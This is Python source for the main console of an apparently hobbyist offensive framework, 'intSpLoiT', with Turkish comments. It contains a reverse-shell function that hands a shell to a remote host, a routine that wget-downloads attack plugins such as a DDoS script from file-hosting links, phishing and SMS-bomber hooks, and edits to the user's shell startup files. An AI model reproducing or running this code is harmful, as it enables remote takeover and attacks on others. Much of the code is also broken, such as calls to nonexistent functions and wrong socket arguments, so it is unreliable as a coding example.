#!/usr/bin/env python3
# -*- coding: utf-8 -*-
global phisherserror
global clouderror
import os
os.system("export INTFRAMEWORK_PATH='/storage/emulated/0/inttest/intframework--ntframeworkV4 (1)/intframework--ntframeworkV4'")
try:
	os.system("$INTFRAMEWORK_PATH") or os.system("echo $INTFRAMEWORK_PATH")
except:
	os.system("export INTFRAMEWORK_PATH=$PREFIX/opt/intframework") or os.system("export INTFRAMEWORK_PATH=usr/opt/intframework")
cto = 0
try:
	if cto != 0:
		pass
	else:
		os.system("echo 'export intmodules_path=$INTFRAMEWORK_PATH/modules' >> ~/.bashrc; echo 'export intmodules_path=$INTFRAMEWORK_PATH/modules' >> ~/.zshrc")
		cto += 1
except:
	pass
	import os, sys

path = os.getenv("INTFRAMEWORK_PATH")
if not path or not os.path.isdir(path):
    sys.exit("[!] INTFRAMEWORK_PATH is not set or is invalid.")

os.chdir(path)
print(f"[✓] Changed working directory to: {path}")

from pyfiglet import Figlet
from colorama import Fore, init, Style
import threading
import requests
import time
import sys
import os
import base64
import time as t
import argparse
import sys
import platform
import getpass
import subprocess
import socket
import psutil
from netaddr import IPNetwork, IPAddress
import argparse
import socket
import re
import threading
import time
import sys
import random
import urllib.request
from queue import Queue
import sqlite3
import json
import requests
import subprocess
import os
import pathlib
import subprocess
import colorama
from rich.console import Console
from prompt_toolkit import prompt
from prompt_toolkit.formatted_text import ANSI
from prompt_toolkit.completion import Completer, Completion
import time
from colorama import Fore, Back, Style
import inttable
import shlex
from lib.int4.event import EventDispatcher
dispatcher = EventDispatcher()
import subprocess, shlex, os
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.history import InMemoryHistory
from prompt_toolkit.history import FileHistory
from prompt_toolkit.formatted_text import StyleAndTextTuples
from prompt_toolkit import PromptSession
from prompt_toolkit.history import InMemoryHistory  # veya FileHistory
from prompt_toolkit.completion import Completer, Completion
from prompt_toolkit.formatted_text import ANSI
from prompt_toolkit import PromptSession
from prompt_toolkit.history import FileHistory
from prompt_toolkit.completion import FuzzyCompleter, Completer, Completion
from prompt_toolkit.lexers import PygmentsLexer
from prompt_toolkit.styles import Style as PTStyle
from prompt_toolkit.validation import Validator, ValidationError
from prompt_toolkit.formatted_text import ANSI
from pygments.lexers.python import PythonLexer
from colorama import Fore, Style
from modules.commands.banner import *
from modules.commands.dns_lookup import *

try:
	from modules import evasionint
except:
	pass
try:
	from modules import usersearcher
except:
	pass
try:
	from modules.usersearcher import searchus, banner, outer_func
except:
	pass
try:
	from modules.exploit_searcher import search_exploits, download_exploit
except:
	pass
try:
	from modules import exploit_searcher
except:
	pass
try:
	from modules import expdatabase
except:
	pass
try:
	from modules import intmodules
except:
	pass
try:
	import intattack
except:
	pass
try:
	from modules.Auxiliary import *
except Exception as e:
	print("[01.intbase] modules.Auxiliary Not founded please reinstall framework")
	pass
try:
	from modules.exploits import *
except Exception as e:
	print("[02.intbase] modules.exploit Not founded please reinstall framework")
	pass
try:
	from modules.exploits import *
except Exception as e:
	print("[03.intbase] modules.exploit Not founded please reinstall framework")
	pass
try:
	from modules import login
except Exception as e:
	pass
try:
	from cloud import intcloud
	clouderror = False
except Exception as e:
	clouderror = True
	pass
try:
	from PHİSHERS import *
	phisherserror = False
except Exception as e:
	phisherserror = True
	pass
try:
	from modules import *
except Exception as e:
	pass
try:
	from modules import network_scan
except Exception as e:
	try:
		import network_scan
	except Exception as e:
		pass
	pass
try:
	from network_scan import *
except:
	pass
	
try:
	from exploiter import *
except:
	pass
try:
	from uuid_manager import *
except:
	pass
from uuid_manager import *
import lib.search
from lib.int4.config_manager import load_context, validate_required_options, module_context, load_schema_from_module
import lib.int4.config_manager as config_manager
# Import the session manager module
import readline
import lib.history_manager as history_manager
from lib.session_manager.manager import SessionManager
import plugin_manager
import atexit
sm = SessionManager()
sm.start_listener()
def goodbye():
    time.sleep(0.5)
    print(Fore.MAGENTA + Style.BRIGHT + "\nShutting down intSpLoiT Framework...")
    time.sleep(1)
    print(Fore.CYAN + r"""
╔════════════════════════════════════════════════════════════════╗
║        Thank you for using intSpLoiT Framework                ║
║        Stay stealthy, stay sharp.                             ║
║        Visit: www.intframeworkweb.onrender.com                ║
╚════════════════════════════════════════════════════════════════╝
""")
    time.sleep(1.2)
    print(Fore.GREEN + "[✓] Session ended safely. See you again, Operator.\n")
    history_manager.save_history()
    
atexit.register(goodbye)
# Instantiate the SessionManager


searcher = lib.search.ModuleSearch()

def manager():
	import plugin_manager as PluginManager
	manager = PluginManager.PluginManager(plugin_dir="plugins", event_manager=event_manager)

richconsole = Console()

def blinking_text(text):
    for _ in range(10):
        console.print(f"[bold red]{text}[/bold red]", end="\r")
        time.sleep(0.3)
        console.print(" " * len(text), end="\r")  # Boşluk ile sil
        time.sleep(0.3)

init(autoreset=True)
import plugin_manager as PluginManager


import os
from colorama import Fore

history_manager = history_manager.HistoryManager()

def pro_plugin():
	try:
		with open("pro.int4", "r+") as pg_pro:
			check_pro = pg_pro.read()
			if "pro_plugin" in check_pro:
				print(f"{Fore.GREEN}[+] Pro plugins are already installed.")
			else:
				print("Installing pro plugins...")
				# Download and move the first plugin
				os.system("wget -O modules/attackers/saddos.py 'https://www.mediafire.com/file/3j3cfk9fnwyhvnd/saddos.py/file?dkey=mvcx5j2ljzi&r=1279'")
				
				# Download and move the second plugin
				os.system("wget -O modules/attackers/intattack.py 'https://download1326.mediafire.com/4f1pgnduz33gbdUNEB0Rx1T0LbSJcSXzrf2pZHJseaL9bd4PRqFN2d4-3qo_kbcHNK_FhoFm17Y5hJq1L29hZHPdMH6r9mb3KBqeG-pLkcdLy39rx2i5Hu0cnzVYKlO_6SNfNiA2FWeVPCx6TqaDKu6sM_yl1-YC4XtwFrFxUUlqduU/qeawqkw70hn6s6b/intattack.py'")
				
				# Write "pro_plugin" flag to file
				pg_pro.write("pro_plugin")
				print(f"{Fore.GREEN}[+] Pro plugins installed successfully. Please restart the framework.")
	except FileNotFoundError:
		print("File pro.int4 not found. Ensure it exists and try again.")

import os
import sqlite3

class NmapDatabase:
    def __init__(self, db_name='nmap_results.db'):
        self.db_name = db_name
        self.conn = sqlite3.connect(self.db_name)
        self.create_table()

    def create_table(self):
        """Veritabanında bir tablo oluşturur."""
        with self.conn:
            self.conn.execute('''
                CREATE TABLE IF NOT EXISTS scans (
                    id INTEGER PRIMARY KEY,
                    target TEXT NOT NULL,
                    port INTEGER NOT NULL,
                    protocol TEXT NOT NULL,
                    state TEXT NOT NULL,
                    service TEXT
                )
            ''')

    def insert_scan_result(self, target, port, protocol, state, service):
        """Tarama sonuçlarını veritabanına ekler."""
        with self.conn:
            self.conn.execute('''
                INSERT INTO scans (target, port, protocol, state, service)
                VALUES (?, ?, ?, ?, ?)
            ''', (target, port, protocol, state, service))

    def list_scan_results(self):
        """Veritabanındaki tarama sonuçlarını listeler."""
        cursor = self.conn.cursor()
        cursor.execute('SELECT * FROM scans')
        rows = cursor.fetchall()
        for row in rows:
            print(row)

    def clear_database(self):
        """Veritabanını temizler."""
        with self.conn:
            self.conn.execute('DROP TABLE IF EXISTS scans')
            self.create_table()  # Yeniden tablo oluştur

    def close(self):
        """Veritabanı bağlantısını kapatır."""
        self.conn.close()

class NmapScanner:
    def __init__(self):
        self.db = NmapDatabase()

    def run_command(self, command):
        """Kullanıcıdan alınan Nmap komutunu çalıştırır."""
        try:
            print(f"Executing command: {command}")
            result = os.popen(command).read()
            print(result)
            self.save_results_to_db(result, command)
        except Exception as e:
            print(f"An error occurred: {e}")

    def save_results_to_db(self, result, command):
        """Tarama sonuçlarını veritabanına kaydeder."""
        target = command.split()[-1]  # Hedef IP veya hostname'i al
        try:
            for line in result.splitlines():
                if "/tcp" in line:  # TCP portları içeren satırları kontrol et
                    parts = line.split()
                    port_info = parts[0].split('/')  # Port bilgilerini ayır
                    port = int(port_info[0])  # Port numarasını al
                    protocol = port_info[1]  # Protokolü al
                    state = parts[-1]  # Durumu al
                    service = parts[1] if len(parts) > 1 else None  # Servis adını al
                    self.db.insert_scan_result(target, port, protocol, state, service)
            print(f"Scan results for {target} saved to database.")
        except Exception as e:
            print(f"An error occurred while saving results to DB: {e}")
def execute_allowed_commands(command):
    # Komutları '&&' veya ';' ile kontrol et ve sırayla çalıştır
    if "&&" in command:
        commands = command.split("&&")  # '&&' ile ayır
    elif ";" in command:
        commands = command.split(";")  # ';' ile ayır
    else:
        commands = [command]  # Tek bir komut varsa

    for cmd in commands:
        cmd = cmd.strip()  # Gereksiz boşlukları kaldır
        try:
            os.system(f"intconsole -x {cmd}")  # Komutu çalıştır
        except Exception as e:
            print(f"Errored: {cmd} is doesnt working. {e}")

def data():
	global LHOSTS
	global LPORTS
	global RHOSTS
	global RPORTS
def False_adresses():
	adr = "$INTFRAMEWORK_PATH"
	random = ["a", "b", "c", "d", "e", "f", "g", "ğ", "h", "ı", "i", "j", "k", "l", "m", "n", "o", "ö", "p", "r", "s", "ş", "t", "u", "ü", "v", "y","x", "z"]
	selecter_num = random.randint(1, 20)
	selecter = random.select(random, selecter_num)
	user = help_input
	special_characters = ["@", "#", "$", "&", "%"  "~"]
	if user in random and special_characters:
		if user in random and special_characters and selecter_num:
			random_super = user
		else:
			random_super = user
	pool = ["{adr}/multi/handler/", "{adr}/modules/enum_{random_super}"]
	return pool
def check_network():
    try:
        # Attempt to connect to Google's DNS server
        socket.create_connection(("8.8.8.8", 53))
        return True
    except OSError:
        return False
        print("You are int-py mode")
# intconsole komutu
    # ASCII sanatı
	
ascii_sanat = """⢀⣠⣤⠶⠶⠶⠶⢦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠛⠁⠀⠀⠀⠀⠀⠀⠈⠙⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⣠⡴⠞⠛⠉⠉⣩⣍⠉⠉⠛⠳⢦⣄⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡀⠀⣴⡿⣧⣀⠀⢀⣠⡴⠋⠙⢷⣄⡀⠀⣀⣼⢿⣦⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣧⡾⠋⣷⠈⠉⠉⠉⠉⠀⠀⠀⠀⠉⠉⠋⠉⠁⣼⠙⢷⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣇⠀⢻⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⠀⣸⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣹⣆⠀⢻⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡟⠀⣰⣏⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⠞⠋⠁⠙⢷⣄⠙⢷⣀⠀⠀⠀⠀⠀⠀⢀⡴⠋⢀⡾⠋⠈⠙⠻⢦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠀⠀⠀⠀⠀⠹⢦⡀⠙⠳⠶⢤⡤⠶⠞⠋⢀⡴⠟⠀⠀⠀⠀⠀⠀⠙⠻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣼⠋⠀⠀⢀⣤⣤⣤⣤⣤⣤⣤⣿⣦⣤⣤⣤⣤⣤⣤⣴⣿⣤⣤⣤⣤⣤⣤⣤⡀⠀⠀⠙⣧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣸⠏⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⢠⣴⠞⠛⠛⠻⢦⡄⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠸⣇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⡟⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⣿⣿⢶⣄⣠⡶⣦⣿⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⢻⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣾⠁⠀⠀⠀⠀⠘⣇⠀⠀⠀⠀⠀⠀⠀⢻⣿⠶⠟⠻⠶⢿⡿⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠈⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢰⡏⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⢾⣄⣹⣦⣀⣀⣴⢟⣠⡶⠀⠀⠀⠀⠀⠀⣼⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣭⣭⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠘⣧⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⢿⡀⠀⠀⠀⠀⠀⠀⣀⡴⠞⠋⠙⠳⢦⣀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⢰⡏⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⢿⣄⣀⠀⠀⢀⣤⣼⣧⣤⣤⣤⣤⣤⣿⣭⣤⣤⣤⣤⣤⣤⣭⣿⣤⣤⣤⣤⣤⣼⣿⣤⣄⠀⠀⣀⣠⡾⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠻⢧⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠼⠟⠛⠛⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
. ⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ⣿⣿⣿⣿⣿⣷⣷⣶⣿⣿ """	
    # 5 saniye boyunca animasyonu çalıştır
os.system("python3 startoolkit.py")
time.sleep(4)   
# Başlangıç işlemleri
import os

def framework_setup():
    hist_file = os.path.expanduser("~/.intframework_history.txt")
    if not os.path.exists(hist_file):
        os.makedirs(os.path.dirname(hist_file), exist_ok=True)
        with open(hist_file, "w"): pass
    if not os.getenv("INTFRAMEWORK_PATH"):
        os.environ["INTFRAMEWORK_PATH"] = os.getcwd()

framework_setup()
init()      
global jobs
# Initialize jobs dictionary
jobs = {}

# Function to add a job
def add_job(job_name, exploit=None):
    job_id = len(jobs) + 1
    jobs[job_id] = {'name': job_name, 'exploit': exploit}

# Function to list jobs
def list_jobs():
    for job_id, job_info in jobs.items():
        job_name = job_info['name']
        exploit = job_info['exploit']
        print(f"[{job_id}] {job_name}: executed")
        print("EXPLOITS")
        print("==========")
        print(f"    {job_id} {exploit if exploit else 'None'}")
        
# Komut dosyasının yolu
command_file = os.path.expanduser("~/.reload.int4")

def save_command(command):
    """Komutu dosyaya kaydet"""
    try:
        with open(command_file, "a") as file:
            file.write(command + "\n")
    except Exception as e:
        print(f"Komut dosyasına kaydedilirken bir hata oluştu: {e}")

# Job silme fonksiyonu
def kill_job(job_id):
    if job_id in jobs:
        print(f"Job [{job_id}] ({jobs[job_id]}) stopped and removed.")
        del jobs[job_id]
    else:
        print(f"No job found with ID: {job_id}")

# Global dictionary to store the options
options = {
    'LHOST': '0.0.0.0',
    'LPORT': '4444',
    'RHOST': '127.0.0.1',  # Default RHOST
    'RPORT': '80',  # Default RPORT
    'PAYLOAD': 'intframework/payloads/reverse_shell.py'
}

global_variables = {}  # Global değişkenler
local_variables = {}  # Yerel değişkenler

# Set edilen değişkenlerin kaydedileceği dosya (Python formatında)
intframework_path = os.getenv("INTFRAMEWORK_PATH")

if intframework_path is None:
    print("Error: INTFRAMEWORK_PATH environment variable is not set.")
else:
    db_path = os.path.join(intframework_path, "lib", "intpro", ".conf")

# setdb fonksiyonu, değişkenleri .conf dosyasına kaydeder
def setdb(variable, value):
    try:
        # INTFRAMEWORK_PATH ortam değişkeni kontrol ediliyor
        intframework_path = os.getenv("INTFRAMEWORK_PATH")
        if not intframework_path:
            raise ValueError("INTFRAMEWORK_PATH not set in environment variables.")

        # Dosyanın var olup olmadığını kontrol et
        if not os.path.exists(db_path):
            # Eğer dosya yoksa, oluştur
            with open(db_path, "w") as f:
                f.write("# Configuration file for set variables\n")

        # Python formatında değişkeni dosyaya yaz
        with open(db_path, "a") as db_file:
            db_file.write(f"{variable} = '{value}'\n")

        print(f"{Fore.GREEN}[+] Variable '{variable}' set to '{value}' and saved to {db_path}.{Style.RESET_ALL}")

    except Exception as e:
        print(f"{Fore.RED}[-] Error in setdb: {e}{Style.RESET_ALL}")

# set fonksiyonu, kullanıcı tarafından belirtilen değişkeni global veya yerel olarak ayarlar
def set_variable(variable, value, global_scope=False):
    try:
        if global_scope:
            global_variables[variable] = value
        else:
            local_variables[variable] = value
        print(f"{Fore.GREEN}[+] Set variable '{variable}' to '{value}'{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[-] Error setting variable: {e}{Style.RESET_ALL}")

# Global değişkenler için set fonksiyonu (setg)
def setg(variable, value):
    set_variable(variable, value, global_scope=True)

# set fonksiyonu (yerel değişkenler için)
def set(variable, value):
    set_variable(variable, value, global_scope=False)



# Modülün tüm seçeneklerini göster
def show_options():
    if modules == "":
        print(f"{Fore.RED}[-] No module loaded.{Style.RESET_ALL}")
        return

    print(f"{Fore.YELLOW}[*] Showing options for module: {Fore.CYAN}{modulename}{Style.RESET_ALL}")
    
    try:
        # Yüklenen modülün Python dosyasını dinamik olarak import ediyoruz
        module = importlib.import_module(modules)

        # Modülün options kısmı var mı kontrol edelim
        if not hasattr(module, 'options'):
            print(f"{Fore.RED}[-] No options found for the module.{Style.RESET_ALL}")
            return

        options = module.options
        
        if not options:
            print(f"{Fore.RED}[-] No options available for this module.{Style.RESET_ALL}")
            return
        
        # Her bir seçeneği kullanıcıya detaylı bir şekilde sunalım
        for option, details in options.items():
            print(f"{Fore.YELLOW}[*] Option: {Fore.CYAN}{option}{Style.RESET_ALL}")
            print(f"  {Fore.GREEN}Description:{Style.RESET_ALL} {details.get('description', 'No description available.')}")
            print(f"  {Fore.GREEN}Type:{Style.RESET_ALL} {details.get('type', 'Unknown')}")
            print(f"  {Fore.GREEN}Default Value:{Style.RESET_ALL} {details.get('default', 'None')}")
            print(f"  {Fore.YELLOW}[*] Usage Example:{Style.RESET_ALL} {details.get('example', 'None')}")
            print("")

    except Exception as e:
        print(f"{Fore.RED}[!] Error while fetching options for module: {e}{Style.RESET_ALL}")

# run fonksiyonu, set edilen değerlerle çalıştırır
def srun():
    try:
        if not modules:
            raise ValueError("No module loaded. Use the 'use' command first.")
        
        # Modülün yolunu ve adını yazdır
        print(f"{Fore.CYAN}[*] Running module: {modules}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[+] Using the following variables:{Style.RESET_ALL}")

        # Tüm değişkenleri göster
        all_variables = {**global_variables, **local_variables}
        for var, val in all_variables.items():
            print(f"  {Fore.GREEN}{var}{Style.RESET_ALL}: {val}")

        # Modülü çalıştırmak için komut oluştur
        command = f"python3 {modules}"

        # Komutu çalıştır
        print(f"{Fore.YELLOW}[*] Executing: {command}{Style.RESET_ALL}")
        os.system(command)

        print(f"{Fore.GREEN}[+] Module '{modulename}' executed successfully with variables!{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[-] Error in run: {e}{Style.RESET_ALL}")
    

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
if check_network():
	print("you are inthacker-mode")
	add_job("network")
else:
	print("you are handler mode")
def bind_tcp(lhosts, lports):
	try:
		s.bind(lhosts, lports)
		conn, addr = s.accept()
		print("tcp addr is accepted ")
	except:
		print("tcp addr is not value or not accepted")
def reverse_tcp(rhosts, rports, addr):
    try:        
        # Connect to the remote host and port
        s.connect((rhosts, rports))
        
        # Redirect standard input/output/error to the socket
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        
        subprocess.call([addr, '-i'])
    except Exception as e:
        print(f"Error: {e}")
        s.close()
def payloads():
    global meterpreter
    global payloads
    global payload_name
    global platform_g
    
    platform_g = platform.system()
    payload_name = ["/intchat/spesific", "/intframework/effuse/1", "/intframework/effuse/2", "/intframework/effuse/3", "/intframework/effuse/4", "/intframework/effuse/5", "/intframework/effuse/6", "/intframework/effuse/7", "/intframework/web/1", "/intframework/web/2", "/intframework/web/3", "/intframework/web/4", "/intframework/web/5", "/intframework/introjan/1", "/intframework/introjan/2", "/intframework/cam/1"]
    
    meterpreter = []
    for pn in payload_name:
        meterpreter.append(f"/{platform_g}{pn}/payloads/meterpreter/reverse_tcp")
        meterpreter.append(f"/{platform_g}{pn}/payloads/meterpreter/bind_tcp")
        meterpreter.append(f"/{platform_g}{pn}/payloads/meterpreter_reverse_tcp")
        meterpreter.append(f"/{platform_g}{pn}/payloads/meterpreter_bind_tcp")

def search_payloads(term):
    global meterpreter
    return [payload for payload in meterpreter if term in payload]
def strips(help_input, name):
    return help_input.split("=", 1)[1].strip() if "=" in help_input else help_input[help_input.find(f"set {name} ") + len(f"set {name} "):].strip() if help_input.find(f"set {name} ") != -1 else help_input.strip()
def print_payloads(payload_list):
    for payload in payload_list:
        platform_part = payload.split('/')[1]
        path_part = '/'.join(payload.split('/')[2:])
        path_part_colored = path_part.replace('effuse', f"{Fore.BLUE}effuse{Style.RESET_ALL}")
        path_part_colored = path_part_colored.replace('web', f"{Fore.BLUE}web{Style.RESET_ALL}")
        path_part_colored = path_part_colored.replace('introjan', f"{Fore.BLUE}introjan{Style.RESET_ALL}")
        path_part_colored = path_part_colored.replace('cam', f"{Fore.BLUE}cam{Style.RESET_ALL}")
        platform_colored = f"{Fore.RED}{platform_part}{Style.RESET_ALL}"
        meterpreter_colored = payload.split('/')[-1].replace('meterpreter', f"{Fore.RED}meterpreter{Style.RESET_ALL}")
        meterpreter_colored = meterpreter_colored.replace('reverse_tcp', f"{Style.BRIGHT}reverse_tcp{Style.RESET_ALL}")
        meterpreter_colored = meterpreter_colored.replace('bind_tcp', f"{Style.BRIGHT}bind_tcp{Style.RESET_ALL}")
        final_payload = f"/{platform_colored}/{path_part_colored}"
        print(final_payload.replace(payload.split('/')[-1], meterpreter_colored))
def used(used):
	if used == "used":
		pass
	else:
		print('you are not used')
def reverse_used(used, helper):
	if used == "used":
		print(f"[{Fore.RED}intbase{Fore.RESET}] you are used the tool", f"""
		example usage:
			{helper}
		""")
	else:
		pass
def dev_tools(dir, tool, norm):
	os.system(f"cd {dir}")
	if tool.lower() == "imei":
		os.system("""echo "imei='python /data/data/com.termux/files/home/intframework/imei.py' >> $INTFRAMEWORK_PATH/.bashrc """)
		used = "used"
		used(used)
	if tool.lower() == "sms" or "smsbomber" or "smsbomb":
		os.system("""echo "alias sms='python /data/data/com.termux/files/home/intframework/sms.py' >> $INTFRAMEWORK_PATH/.bashrc """)
	if tool.lower() == "connectbot":
		os.system("""echo "alias connectbot='python /data/data/com.termux/files/home/intframework/connectbot.py' >> $INTFRAMEWORK_PATH/.bashrc """)
	used_dev_tools = "used"
	os.system("source ~/.bashrc")
	used(used_dev-tools)
def launch_normaltools():
	pass
def search_evasions():
	os.system("python3 evasionint.py -s")
def listen_p(ip, port):
    # Soket oluştur
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((ip, port))
    server_socket.listen(5)  # 5'e kadar bekleme kuyruğu
    print(f"Listening on {ip}:{port}")

    while True:
        client_socket, addr = server_socket.accept()
        print(f"Connection from {addr}")

        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            print(f"Received data: {data.decode('utf-8')}")
        
        client_socket.close()
        print(f"Connection from {addr} closed")

def login(username, password):
	login.register(username, password)
def bannerss(help_input):
	global bannerss	
	bannerss = help_input[12:] or help_input[15:]
	banner()
	banners += bannerss	
	
def inputrs(sk):
	if sk.lower("y" or "yes"):
		pass
	if sk.lower("n" or "no"):
		exit()
	else:
		exit()
def parse_input(input_str):
    parts = input_str.split(':')
    if len(parts) == 1:
        return parts[0].split()[0], None
    elif len(parts) == 2:
        if parts[1].isdigit():
            return parts[0].split()[0], int(parts[1])
        else:
            raise ValueError("Geçersiz giriş formatı. Port sayısı geçerli bir tamsayı olmalıdır.")
    else:
        raise ValueError("Geçersiz giriş formatı. IP adresi/domain ve opsiyonel olarak port giriniz.")
def db_connect():
    # Veritabanına bağlan (örneğin, SQLite kullanıyorsanız)
    connection = sqlite3.connect('database.db')
    cursor = connection.cursor()
    return connection, cursor

def db_list(connection=sqlite3.connect('database.db'), cursor="connection.cursor()"):
    # Komutları listeleyin (örneğin, veritabanındaki tabloları listeleme)
    cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
    tables = cursor.fetchall()
    for table in tables:
        print(f"Tablo adı: {table[0]}")

def db_disconnect(connection=sqlite3.connect('database.db')):
    # Bağlantıyı kapat
    connection.close()


payloads = None
promptin = None
def get_meterpreter():
    global payloads
    try:
        result = subprocess.run(["python3", "intmeterpreter.py", "-pe"], check=True, capture_output=True, text=True)
        payloads = result.stdout.strip()  # Ensure payloads are stripped of any extra whitespace
    except subprocess.CalledProcessError as e:
        pass



def check_ip(ip):
    # Check if the IP address is valid
    try:
        socket.inet_aton(ip)
        print(f"{ip} is a valid IP address.")
    except socket.error:
        print(f"{ip} is not a valid IP address.")
        return
    
    # Try to connect to the IP address
    try:
        response = requests.get(f"http://{ip}")
        if response.status_code == 200:
            print(f"Successfully connected to {ip}.")
        else:
            print(f"Failed to connect to {ip}, status code: {response.status_code}")
    except requests.ConnectionError:
        print(f"Failed to connect to {ip}.")

def exploits(exp_name, output=None):
    os.system(f"python3 exploit_searcher.py keyword {exp_name} {'-o ' + output if output else ''}")
def listen(ip):
    HOST = ip 
    PORT = 5555

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.bind((HOST, PORT))
        s.listen(1)
        print('Socket bind complete')
        conn, addr = s.accept()
        print('Connected with ' + addr[0] + ':' + str(addr[1]))
        add_job(f"Listening {host}")
    except socket.error as msg:
        print('Bind failed. Error Code : ' + str(msg.errno) + ' Message ' + msg.strerror)
        pass
def user_count(help_input, repeat_count=2):
	inputs = []
	targets = ["set rhosts", "set rports", "set lports", "set lports", "set rhost", "set rport"]
	inputs.append(help_input)
	if help_input.lower() in targets and inputs.count(help_input) == repeat_count:
		if targets == "set rhosts" or "set rhost":
			print("""you are used rhosts you are must use ("del rhosts") or ("del rhost")  """)
		if targets == "set rport" or "set rports":
			print("""you are used rhosts you are must use ("del rports") or ("del rport")  """)
		if targets == "set lhost" or "set lhosts":
			print("""you are used rhosts you are must use ("del lhosts") or ("del lhost")  """)
